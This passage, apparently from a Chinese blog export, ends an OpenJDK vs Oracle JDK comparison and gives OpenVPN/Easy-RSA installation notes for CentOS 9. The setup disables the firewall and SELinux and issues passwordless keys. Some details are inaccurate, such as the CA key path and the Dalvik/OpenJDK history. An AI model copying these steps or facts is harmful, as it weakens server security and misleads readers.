title=\"OpenJDK Vs Oracle JDK\"></a>OpenJDK Vs Oracle JDK</h2><p><code>OpenJDK</code>和<code>Oracle JDK</code> 是通过<code>TCK</code>认证的同一Java规范的实现。换句话说，<code>Oracle JDK</code>是<code>OpenJDK</code>的商业发行版（非开源发行版），就如同Chrome和Chrominum的关系。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">项目</th>\n<th align=\"center\">Oracle JDK</th>\n<th align=\"center\">OpenJDK</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">许可证</td>\n<td align=\"center\">Oracle公司的商业（非开源）许可证</td>\n<td align=\"center\">基于GPL v2许可证的开源授权</td>\n</tr>\n<tr>\n<td align=\"center\">开发方</td>\n<td align=\"center\">Oracle公司，可以使用Java商标</td>\n<td align=\"center\">OpenJDK开源社区，不允许使用Java商标</td>\n</tr>\n<tr>\n<td align=\"center\">性能优化</td>\n<td align=\"center\">根据Sun JDK的开发和实现提供性能</td>\n<td align=\"center\">提供由Oracle JDK之上的一些供应商开发的高性能</td>\n</tr>\n<tr>\n<td align=\"center\">发行方式</td>\n<td align=\"center\">仅提供二进制代码</td>\n<td align=\"center\">基于社区源代码，各方自行定制发行版</td>\n</tr>\n<tr>\n<td align=\"center\">费用</td>\n<td align=\"center\">基于Oracle许可证，高级功能可能收费</td>\n<td align=\"center\">完全开源和免费使用</td>\n</tr>\n<tr>\n<td align=\"center\">操作系统</td>\n<td align=\"center\">Windows，Linux，Solaris，MacOS</td>\n<td align=\"center\"><strong>FreeBSD</strong>，Linux，Microsoft Windows，Mac OS X</td>\n</tr>\n</tbody></table>\n<p>简单一点说，<code>OpenJDK</code>源代码是<code>Oracle JDK</code>的一个子集，只包含最精简的JDK。</p>\n<ul>\n<li>OpenJDK不包含Deployment组件（Browser Plugin、Java Web Start、Java控制面板等），当然这些功能也没人用</li>\n<li>由于<code>OpenJDK</code>采用<code>GPL</code>许可证，<code>Oracle JDK</code>的一部分源代码（例如JMX的SNMP功能）由于产权的问题无法开园，只能作为Plug可选插件方式提供给OpenJDK编译时使用。而Icedtea则为这些不完整的部分开发了相同功能、但是符合<code>GPL</code>许可证的源代码，促使OpenJDK更加完整</li>\n<li>Oracle JDK的大部分源代码来自于Open JDK，但包含一些Oracle尚未开源的技术组件，也有一些来自于第三方授权的技术组件</li>\n</ul>\n<img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/vs.jpeg\" class=\"\">\n\n<h2 id=\"OpenJDK-Builds-二进制发行版\"><a href=\"#OpenJDK-Builds-二进制发行版\" class=\"headerlink\" title=\"OpenJDK Builds - 二进制发行版\"></a>OpenJDK Builds - 二进制发行版</h2><h3 id=\"1-Oracle-OpenJDK\"><a href=\"#1-Oracle-OpenJDK\" class=\"headerlink\" title=\"1. Oracle OpenJDK\"></a>1. Oracle OpenJDK</h3><p>没错！OpenJDK Community只负责产生OpenJDK源代码，并不提供可以直接使用的二进制文件格式。<br>OpenJDK官网指向的可下载二进制文件的地址，实际是Oracle公司自行编译后提供的软件。就是这个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"built_in\">test</span> ~]<span class=\"comment\"># java -version</span></span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;1.8.0_312&quot;</span></span><br><span class=\"line\">OpenJDK Runtime Environment (build 1.8.0_312-b07)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM (build 25.312-b07, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Eclipse-Open-J9\"><a href=\"#2-Eclipse-Open-J9\" class=\"headerlink\" title=\"2. Eclipse Open J9\"></a>2. Eclipse Open J9</h3><p>1996年，IBM公司基于Smalltalk VM开发了J9 VM，并广泛应用于其各类自有产品线。<br>2017年，J9成为Eclipse基金会项目，改名为Open J9，并完全符合 Java JVM 规范。</p>\n<h3 id=\"3-Oracle-GraalVM\"><a href=\"#3-Oracle-GraalVM\" class=\"headerlink\" title=\"3. Oracle GraalVM\"></a>3. Oracle GraalVM</h3><p><code>Graal</code>起源于Sun公司的Maxine虚拟机项目，也是基于HotSpot VM，可以认为是HotSpot的一个变种。<br>特点是有独立的JIT编译器、支持AOT提前编译的等，允许在单个程序中自由混合来自任何编程语言的代码等。<br>Oracle公司现在<code>GraalVM Enterprise</code>的名义提供该产品。<br>第一个正式版本 Graal VM 19.0 于 2019 年 5 月发布。最新版本是 Graal VM 21.0.0，于 2021 年 1 月发布。</p>\n<h3 id=\"4-Azul-Zulu\"><a href=\"#4-Azul-Zulu\" class=\"headerlink\" title=\"4. Azul Zulu\"></a>4. Azul Zulu</h3><p>Azul Systems公司是一家专门从事 Java 和 JVM 产品的公司。主要提供<code>OpenJDK</code> 二进制分发版，并命名为<code>Zulu</code>，包含三个版本：</p>\n<ul>\n<li><code>Zulu Community</code>：基于<code>GPLv2</code>协议的社区免费版</li>\n<li><code>Zulu Enterprise</code>：商业发行版</li>\n<li><code>Zulu Embedded</code>：为嵌入式、移动和物联网设备使用的版本</li>\n<li><code>Zulu PlatForm Prime</code>：服务器使用的高性能版本，原名<code>Zing VM</code></li>\n</ul>\n<blockquote>\n<p>为了适配Apple M1芯片，目前Mackbook Air仅能适配<code>OpenJDK 64-Bit Server VM Zulu16.28+11-CA (build 16+36, mixed mode)</code></p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@bogon ~ % java -version</span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;16&quot;</span> 2021-03-16</span><br><span class=\"line\">OpenJDK Runtime Environment Zulu16.28+11-CA (build 16+36)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM Zulu16.28+11-CA (build 16+36, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录1-TCK-Java技术兼容性认证\"><a href=\"#附录1-TCK-Java技术兼容性认证\" class=\"headerlink\" title=\"附录1: TCK - Java技术兼容性认证\"></a>附录1: TCK - Java技术兼容性认证</h2><p>虽然人人都可以运用Java语言编程，Sun仍将Java SE的函数库作为预先编译的Java字节码，附带其API接口一并提供给用户，同时通过技术兼容性测试工具包<code>TCK(Technology Compatibility Kit)</code>以检查第三方产品是否符合Java的规范要求，以确保对java语言生态的有效控制。</p>\n<p>其中，最著名的事件就是<code>Apache Harmony</code>开源项目。</p>\n<p>2005年，Apache基金会主导了<code>Apache Harmony</code>开源项目，目标是以开放源代码方式实现Java SDK，IBM等公司提供了大量代码。<br>由于一直无法获得TCK授权，2011年10月项目宣布停止。核心原因是Java Community Process规定的<code>GPL</code>许可证，与<code>Apache</code>许可证不兼容</p>\n<p>值得指出的是，Google在<code>Android</code>早期开发中，曾经大量使用该项目的源代码，为此长期陷入与Java的专利诉讼，最终决定基于<code>OpenJDK</code>，采用<code>Clean Room</code>模式自主开发了<code>Dalvik VM</code>。</p>\n<p>事实上，谷歌在开放Android时之所以会舍弃Linux的开发语言C&#x2F;C++，关键原因就在于其无法满足Android的二进制分发及跨设备需求，而在抛开不注重运行效率的Python、Ruby等语言后，剩下的也就只有Sun Microsystem的Java与微软的C#。由于当时微软对于开源的态度，也就使得Java就成为了几乎是唯一的选择。</p>\n<p>2021年4月5日，美国最高法院以6票支持2票反对的投票结果，驳回了此前一家联邦巡回法院就甲骨文诉Android侵犯Java版权案作出的裁定，并最终判定谷歌复制Java API代码属于合理使用（fair use）。</p>\n<h2 id=\"附录2：常见的许可证协议\"><a href=\"#附录2：常见的许可证协议\" class=\"headerlink\" title=\"附录2：常见的许可证协议\"></a>附录2：常见的许可证协议</h2><img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/license.jpg\" class=\"\">\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li>Java Community Process的官网：<a href=\"https://jcp.org/en/home/index\">https://jcp.org/</a></li>\n<li>OpenJDK Community的官网：<a href=\"http://openjdk.java.net/\">http://openjdk.java.net/</a></li>\n<li>OpenJDK Project的Github源码：<a href=\"https://github.com/openjdk/jdk\">https://github.com/openjdk/jdk</a></li>\n</ul>\n<h3 id=\"技术评论\"><a href=\"#技术评论\" class=\"headerlink\" title=\"技术评论\"></a>技术评论</h3><ul>\n<li><a href=\"https://blog.csdn.net/ni_hao_fan/article/details/99677950\">JSR管理模式简介和核心技术规范清单</a></li>\n<li><a href=\"https://zh.wikipedia.org/zh-hans/%E7%94%B2%E9%AA%A8%E6%96%87%E8%AF%89%E8%B0%B7%E6%AD%8CJava%E4%BE%B5%E6%9D%83%E6%A1%88\">甲骨文诉谷歌Java侵权案 - WiKI</a></li>\n<li><a href=\"https://www.jiemian.com/article/5914484.html\">世纪诉讼迎来终局，Android不会有Java税了</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/31881162\">开源许可证GPL、BSD、MIT、Mozilla、Apache和LGPL的区别</a></li>\n<li><a href=\"https://juejin.cn/post/6844903811069247496\">Oracle与OpenJDK之间的区别</a></li>\n</ul>\n"},{"title":"OpenVPN 安装笔记","url":"/2025/01/04/OpenVPN-%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/","content":"<p>OpenVPN 是一种开源的 VPN 软件应用程序，它允许远程访问或连接到私有网络，其关键特点和功能包括：</p>\n<ul>\n<li>支持多种加密算法，包括 AES、DES、3DES 等</li>\n<li>支持多种网络协议，如 UDP 和 TCP</li>\n<li>支持多种认证方式，包括预共享密钥、证书、用户名和密码</li>\n<li>支持多种操作系统，包括 Windows、Linux、macOS、Android 和 iOS 等，并提供 GUI 工具帮助用户更方便地配置和管理</li>\n</ul>\n<p>Easy-RSA 是一个用于管理 X.509 PKI（公钥基础设施）的工具，主要用于生成和管理数字证书。它提供了创建证书颁发机构（CA）、生成服务器和客户端证书、管理证书注销列表（CRL）等功能。<br>Easy-RSA 通过脚本封装了 OpenSSL 的复杂命令，使得证书的生成和管理过程更加简单和自动化。例如，使用 Easy-RSA 可以通过简单的命令来初始化 PKI 目录、生成 CA 证书、生成服务器和客户端证书等</p>\n<h2 id=\"一、服务器环境准备\"><a href=\"#一、服务器环境准备\" class=\"headerlink\" title=\"一、服务器环境准备\"></a>一、服务器环境准备</h2><p>选择一台有公网地址的服务器，本次安装的操作系统为 CentOS 9 Stream x64。</p>\n<h3 id=\"1-网络配置和内核参数优化\"><a href=\"#1-网络配置和内核参数优化\" class=\"headerlink\" title=\"1. 网络配置和内核参数优化\"></a>1. 网络配置和内核参数优化</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭防火墙</span></span><br><span class=\"line\">systemctl stop firewalld</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> firewalld</span><br><span class=\"line\">systemctl status firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭Selinux</span></span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/enforcing/disabled/&#x27;</span> /etc/selinux/config</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 内核参数优化</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.core.default_qdisc = fq&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.core.somaxconn = 21644&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.ipv4.conf.default.rp_filter = 0&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.ipv4.ip_forward = 1&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.ipv4.tcp_congestion_control = bbr&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.ipv4.tcp_fastopen = 3&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;net.netfilter.nf_conntrack_max = 1048576&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"></span><br><span class=\"line\">sysctl -p</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-下载软件包\"><a href=\"#2-下载软件包\" class=\"headerlink\" title=\"2. 下载软件包\"></a>2. 下载软件包</h3><p>当前版本：openvpn 2.6.2 + easy-rsa 3.1.6</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装依赖包</span></span><br><span class=\"line\">yum -y install gcc lzo-devel pam-devel </span><br><span class=\"line\">epel-release</span><br><span class=\"line\">yum -y install easy-rsa libnl3-devel libcap-ng-devel openssl-devel lz4-devel</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下载源代码</span></span><br><span class=\"line\">wget https://swupdate.openvpn.org/community/releases/openvpn-2.6.2.tar.gz</span><br><span class=\"line\">tar -xvf openvpn-2.6.2.tar.gz</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、编译-openvpn\"><a href=\"#二、编译-openvpn\" class=\"headerlink\" title=\"二、编译 openvpn\"></a>二、编译 openvpn</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 编译二进制文件，安装目录：/usr/local/openvpn</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> openvpn-2.6.2</span><br><span class=\"line\">./configure --prefix=/usr/local/openvpn --disable-dco</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置 PATH 环境变量</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;PATH=\\$PATH:/usr/local/openvpn/sbin&quot;</span> &gt; /etc/profile.d/openvpn256.sh</span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查openvpn 版本信息</span></span><br><span class=\"line\">openvpn --version</span><br></pre></td></tr></table></figure>\n\n<p>编译成功后，应正确输出版本信息：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">OpenVPN 2.6.2 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD]</span><br><span class=\"line\">library versions: OpenSSL 3.2.2 4 Jun 2024, LZO 2.10</span><br><span class=\"line\">Originally developed by James Yonan</span><br><span class=\"line\">Copyright (C) 2002-2023 OpenVPN Inc &lt;sales@openvpn.net&gt;</span><br><span class=\"line\">Compile time defines: enable_async_push=no enable_comp_stub=no enable_crypto_ofb_cfb=yes enable_dco=no enable_debug=yes enable_dlopen=unknown enable_dlopen_self=unknown enable_dlopen_self_static=unknown enable_fast_install=yes enable_fragment=yes enable_iproute2=no enable_libtool_lock=yes enable_lz4=yes enable_lzo=yes enable_management=yes enable_pam_dlopen=no enable_pedantic=no enable_pkcs11=no enable_plugin_auth_pam=yes enable_plugin_down_root=yes enable_plugins=yes enable_port_share=yes enable_selinux=no enable_shared=yes enable_shared_with_static_runtimes=no enable_small=no enable_static=yes enable_strict=no enable_strict_options=no enable_systemd=no enable_werror=no enable_win32_dll=yes enable_wolfssl_options_h=yes enable_x509_alt_username=no with_aix_soname=aix with_crypto_library=openssl with_gnu_ld=yes with_mem_check=no with_openssl_engine=auto with_sysroot=no</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、证书制作\"><a href=\"#三、证书制作\" class=\"headerlink\" title=\"三、证书制作\"></a>三、证书制作</h2><h3 id=\"1-环境准备\"><a href=\"#1-环境准备\" class=\"headerlink\" title=\"1. 环境准备\"></a>1. 环境准备</h3><p>前面安装的 easy-rsa 位于 <code>/usr/share/easy-rsa</code>，可能有多个版本的目录。<br>当前版本是 3.1.6，复制代码到 openvpn 的安装目录，便于后续制作证书。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 拷贝软件包</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> -r /usr/share/easy-rsa/3.1.6/ /usr/local/openvpn/easy-rsa</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拷贝配置文件</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /usr/share/doc/easy-rsa/vars.example /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /usr/local/openvpn/easy-rsa</span><br><span class=\"line\">./easyrsa init-pki</span><br></pre></td></tr></table></figure>\n\n<p>初始化成功后，可以看到如下输出信息：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">&#x27;init-pki&#x27; complete; you may now create a CA or requests.</span><br><span class=\"line\"></span><br><span class=\"line\">Your newly created PKI dir is:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki</span><br><span class=\"line\"></span><br><span class=\"line\">Using Easy-RSA configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-创建-CA-证书\"><a href=\"#2-创建-CA-证书\" class=\"headerlink\" title=\"2. 创建 CA 证书\"></a>2. 创建 CA 证书</h3><p>以 自定义 CA 的名义，为 caogo 颁布 CA 证书，无密码登录方式。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa build-ca nopass</span><br></pre></td></tr></table></figure>\n\n<p>处理结果：</p>\n<ul>\n<li>CA 证书文件：<code>/usr/local/openvpn/easy-rsa/pki/ca.crt</code></li>\n<li>CA 私钥文件：<code>/usr/local/openvpn/easy-rsa/pki/issued/ca.key</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">...+.....+.........+...+.+..+.......+......+..+.......+...+...+.....+.......+..+.......+.....+.+........+.+...+.....+...+.........+.+...++++++</span><br><span class=\"line\">-----</span><br><span class=\"line\">You are about to be asked to enter information that will be incorporated</span><br><span class=\"line\">into your certificate request.</span><br><span class=\"line\">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class=\"line\">There are quite a few fields but you can leave some blank</span><br><span class=\"line\">For some fields there will be a default value,</span><br><span class=\"line\">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class=\"line\">-----</span><br><span class=\"line\">Common Name (eg: your user, host, or server name) [Easy-RSA CA]:caogo</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">CA creation complete. Your new CA certificate is at:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/ca.crt</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-生成-Server-证书\"><a href=\"#3-生成-Server-证书\" class=\"headerlink\" title=\"3. 生成 Server 证书\"></a>3. 生成 Server 证书</h3><p>为 Server 创建非对称密钥对，并使用 caogo 的 CA 证书 为公钥签名。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa build-server-full caogo nopass</span><br></pre></td></tr></table></figure>\n\n<p>处理结果：</p>\n<ul>\n<li>服务器证书文件：<code>/usr/local/openvpn/easy-rsa/pki/issued/caogo.crt</code></li>\n<li>服务器私钥文件：<code>/usr/local/openvpn/easy-rsa/pki/private/caogo.key</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">.........+...+.....+.............+..+...+.......+++++++++++++++++++++++++++++++++++++++*..+.+......+........+..........++++++</span><br><span class=\"line\">-----</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">Private-Key and Public-Certificate-Request files created.</span><br><span class=\"line\">Your files are:</span><br><span class=\"line\">* req: /usr/local/openvpn/easy-rsa/pki/reqs/caogo.req</span><br><span class=\"line\">* key: /usr/local/openvpn/easy-rsa/pki/private/caogo.key </span><br><span class=\"line\"></span><br><span class=\"line\">You are about to sign the following certificate:</span><br><span class=\"line\">Request subject, to be signed as a server certificate </span><br><span class=\"line\">for &#x27;825&#x27; days:</span><br><span class=\"line\"></span><br><span class=\"line\">subject=</span><br><span class=\"line\">    commonName                = caogo</span><br><span class=\"line\"></span><br><span class=\"line\">Type the word &#x27;yes&#x27; to continue, or any other input to abort.</span><br><span class=\"line\">  Confirm request details: yes</span><br><span class=\"line\"></span><br><span class=\"line\">Using configuration from /usr/local/openvpn/easy-rsa/pki/openssl-easyrsa.cnf</span><br><span class=\"line\">Check that the request matches the signature</span><br><span class=\"line\">Signature ok</span><br><span class=\"line\">The Subject&#x27;s Distinguished Name is as follows</span><br><span class=\"line\">commonName            :ASN.1 12:&#x27;caogo&#x27;</span><br><span class=\"line\">Certificate is to be certified until Apr  9 10:05:01 2027 GMT (825 days)</span><br><span class=\"line\"></span><br><span class=\"line\">Write out database with 1 new entries</span><br><span class=\"line\">Database updated</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">Certificate created at:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/issued/caogo.crt</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">Inline file created:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/inline/caogo.inline</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-制作-Client-证书\"><a href=\"#4-制作-Client-证书\" class=\"headerlink\" title=\"4. 制作 Client 证书\"></a>4. 制作 Client 证书</h3><p>对于一个 Server 可以为不同用户分别制作 Client 证书。<br>注意，你可以将一份证书提供给多人，他们可以同时使用 VPN，但无法相互连通（IP地址相同）。<br>当然，OpenVPN 也可以将 MySQL 作为后端，提供大量用户的证书管理功能，这里就不介绍了！</p>\n<h4 id=\"创建-x-client-用户\"><a href=\"#创建-x-client-用户\" class=\"headerlink\" title=\"创建 x-client 用户\"></a>创建 x-client 用户</h4><p>为 x 用户创建客户端证书，名字就是 x-client，未设密码。<br>对于不同用户，可以再来一个 y-client，或者 z-client。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa gen-req x-client nopass</span><br></pre></td></tr></table></figure>\n\n<p>处理结果：</p>\n<ul>\n<li>Client 私钥文件：<code>/usr/local/openvpn/easy-rsa/pki/private/x-client.key</code></li>\n<li>Client 中间文件：<code>/usr/local/openvpn/easy-rsa/pki/reqs/x-client.req</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">.+...................+++++++++++++++++++++++++++++++++++++++*.+......+......+......+.......+..+....+.....+....+..+...+.......+.........+..+...+.+.........+..+....+...+..+.+...</span><br><span class=\"line\">-----</span><br><span class=\"line\">You are about to be asked to enter information that will be incorporated</span><br><span class=\"line\">into your certificate request.</span><br><span class=\"line\">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class=\"line\">There are quite a few fields but you can leave some blank</span><br><span class=\"line\">For some fields there will be a default value,</span><br><span class=\"line\">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class=\"line\">-----</span><br><span class=\"line\">Common Name (eg: your user, host, or server name) [x-client]:x</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">Private-Key and Public-Certificate-Request files created.</span><br><span class=\"line\">Your files are:</span><br><span class=\"line\">* req: /usr/local/openvpn/easy-rsa/pki/reqs/x-client.req</span><br><span class=\"line\">* key: /usr/local/openvpn/easy-rsa/pki/private/x-client.key</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"制作-x-client-证书\"><a href=\"#制作-x-client-证书\" class=\"headerlink\" title=\"制作 x-client 证书\"></a>制作 x-client 证书</h4><p>使用 caogo 的 CA 证书为 x-client 的公钥文件签名。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa sign client  x-client</span><br></pre></td></tr></table></figure>\n\n<p>处理结果：</p>\n<ul>\n<li>Client 签名证书：<code>/usr/local/openvpn/easy-rsa/pki/issued/x-client.crt</code></li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">You are about to sign the following certificate:</span><br><span class=\"line\">Please check over the details shown below for accuracy. Note that this request</span><br><span class=\"line\">has not been cryptographically verified. Please be sure it came from a trusted</span><br><span class=\"line\">source or that you have verified the request checksum with the sender.</span><br><span class=\"line\">Request subject, to be signed as a client certificate </span><br><span class=\"line\">for &#x27;825&#x27; days:</span><br><span class=\"line\"></span><br><span class=\"line\">subject=</span><br><span class=\"line\">    commonName                = x</span><br><span class=\"line\"></span><br><span class=\"line\">Type the word &#x27;yes&#x27; to continue, or any other input to abort.</span><br><span class=\"line\">  Confirm request details: yes</span><br><span class=\"line\"></span><br><span class=\"line\">Using configuration from /usr/local/openvpn/easy-rsa/pki/openssl-easyrsa.cnf</span><br><span class=\"line\">Check that the request matches the signature</span><br><span class=\"line\">Signature ok</span><br><span class=\"line\">The Subject&#x27;s Distinguished Name is as follows</span><br><span class=\"line\">commonName            :ASN.1 12:&#x27;x&#x27;</span><br><span class=\"line\">Certificate is to be certified until Apr  9 11:21:39 2027 GMT (825 days)</span><br><span class=\"line\"></span><br><span class=\"line\">Write out database with 1 new entries</span><br><span class=\"line\">Database updated</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">Certificate created at:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/issued/x-client.crt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"创建-y-client-用户-证书签名\"><a href=\"#创建-y-client-用户-证书签名\" class=\"headerlink\" title=\"创建 y-client 用户 &amp; 证书签名\"></a>创建 y-client 用户 &amp; 证书签名</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa gen-req y-client nopass</span><br><span class=\"line\">./easyrsa sign client y-client</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-生成-Diffie-Hellman-文件\"><a 